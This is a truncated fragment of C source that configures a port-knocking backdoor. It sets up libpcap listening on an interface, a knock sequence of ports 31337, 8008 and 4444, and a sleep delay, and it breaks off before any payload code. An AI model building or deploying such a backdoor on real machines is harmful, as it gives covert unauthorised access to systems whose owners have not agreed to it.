#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>

/* ===== Backdoor =====*/
#define INTERFACE "lo"                     // interface to listen on
//#define SINGLE_KNOCK "31337"             // used for listening on a single port
#define MULTI_KNOCK "31337","8008","4444"  // if want to define in command line: -DMULTI_KNOCK=\"31337\",\"8008\",\"4444\"
#define NUM_PORTS 3                        // how many ports will be knocked. Required only for MULTI_KNOCK. len(MULTI_KNOCK)
#define SLEEP 3                            // ifdef, the programs will sleep for x seconds after process executi
